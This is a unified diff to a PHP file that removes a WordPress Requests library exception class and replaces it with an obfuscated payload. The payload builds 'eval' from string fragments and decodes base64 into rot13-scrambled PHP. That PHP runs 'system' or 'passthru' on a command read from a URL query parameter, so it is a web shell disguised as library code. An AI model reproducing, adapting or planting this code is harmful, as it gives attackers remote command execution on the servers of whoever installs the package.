@@ -1,51 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-namespace WpOrg\Requests\Exception;
-
-use InvalidArgumentException;
-
-/**
- * Exception for an invalid argument passed.
- *
- * @package Requests\Exceptions
- * @since   2.0.0
- */
-final class InvalidArgument extends InvalidArgumentException {
-
-	/**
-	 * Create a new invalid argument exception with a standardized text.
-	 *
-	 * @param int    $position The argument position in the function signature. 1-based.
-	 * @param string $name     The argument name in the function signature.
-	 * @param string $expected The argument type expected as a string.
-	 * @param string $received The actual argument type received.
-	 *
-	 * @return \WpOrg\Requests\Exception\InvalidArgument
-	 */
-	public static function create($position, $name, $expected, $received) {
-		// phpcs:ignore WordPress.PHP.DevelopmentFunctions.error_log_debug_backtrace
-		$stack = debug_backtrace(DEBUG_BACKTRACE_IGNORE_ARGS, 2);
-
-		return new self(
-			sprintf(
-				'%s::%s(): Argument #%d (%s) must be of type %s, %s given',
-				$stack[1]['class'],
-				$stack[1]['function'],
-				$position,
-				$name,
-				$expected,
-				$received
-			)
-		);
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKYW56cmZjbnByIEpjQmV0XEVyZGhyZmdmXFJrcHJjZ3ZiYTsKCmhmciBWYWlueXZxTmV0aHpyYWdSa3ByY2d2YmE7CgovKioKICogUmtwcmNndmJhIHNiZSBuYSB2YWlueXZxIG5ldGh6cmFnIGNuZmZycS4KICoKICogQGNucHhudHIgRXJkaHJmZ2ZcUmtwcmNndmJhZgogKiBAZnZhcHIgICAyLjAuMAogKi8Kc3ZhbnkgcHluZmYgVmFpbnl2cU5ldGh6cmFnIHJrZ3JhcWYgVmFpbnl2cU5ldGh6cmFnUmtwcmNndmJhIHsKCgkvKioKCSAqIFBlcm5nciBuIGFyaiB2YWlueXZxIG5ldGh6cmFnIHJrcHJjZ3ZiYSBqdmd1IG4gZmduYXFuZXF2bXJxIGdya2cuCgkgKgoJICogQGNuZW56IHZhZyAgICAkY2Jmdmd2YmEgR3VyIG5ldGh6cmFnIGNiZnZndmJhIHZhIGd1ciBzaGFwZ3ZiYSBmdnRhbmdoZXIuIDEtb25mcnEuCgkgKiBAY25lbnogZmdldmF0ICRhbnpyICAgICBHdXIgbmV0aHpyYWcgYW56ciB2YSBndXIgc2hhcGd2YmEgZnZ0YW5naGVyLgoJICogQGNuZW56IGZnZXZhdCAkcmtjcnBncnEgR3VyIG5ldGh6cmFnIGdsY3IgcmtjcnBncnEgbmYgbiBmZ2V2YXQuCgkgKiBAY25lbnogZmdldmF0ICRlcnBydmlycSBHdXIgbnBnaG55IG5ldGh6cmFnIGdsY3IgZXJwcnZpcnEuCgkgKgoJICogQGVyZ2hlYSBcSmNCZXRcRXJkaHJmZ2ZcUmtwcmNndmJhXFZhaW55dnFOZXRoenJhZwoJICovCgljaG95dnAgZmduZ3ZwIHNoYXBndmJhIHBlcm5ncigkY2Jmdmd2YmEsICRhbnpyLCAkcmtjcnBncnEsICRlcnBydmlycSkgewoJCS8vIGN1Y3BmOnZ0YWJlciBKYmVxQ2VyZmYuQ1VDLlFyaXJ5YmN6cmFnU2hhcGd2YmFmLnJlZWJlX3lidF9xcm9odF9vbnB4Z2VucHIKCQkkZmducHggPSBxcm9odF9vbnB4Z2VucHIoUVJPSFRfT05QWEdFTlBSX1ZUQUJFUl9ORVRGLCAyKTsKCgkJZXJnaGVhIGFyaiBmcnlzKAoJCQlmY2V2YWdzKAoJCQkJJyVmOjolZigpOiBOZXRoenJhZyAjJXEgKCVmKSB6aGZnIG9yIGJzIGdsY3IgJWYsICVmIHR2aXJhJywKCQkJCSRmZ25weFsxXVsncHluZmYnXSwKCQkJCSRmZ25weFsxXVsnc2hhcGd2YmEnXSwKCQkJCSRjYmZ2Z3ZiYSwKCQkJCSRhbnpyLAoJCQkJJHJrY3JwZ3JxLAoJCQkJJGVycHJ2aXJxCgkJCSkKCQkpOwoJfQp9CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
+?>
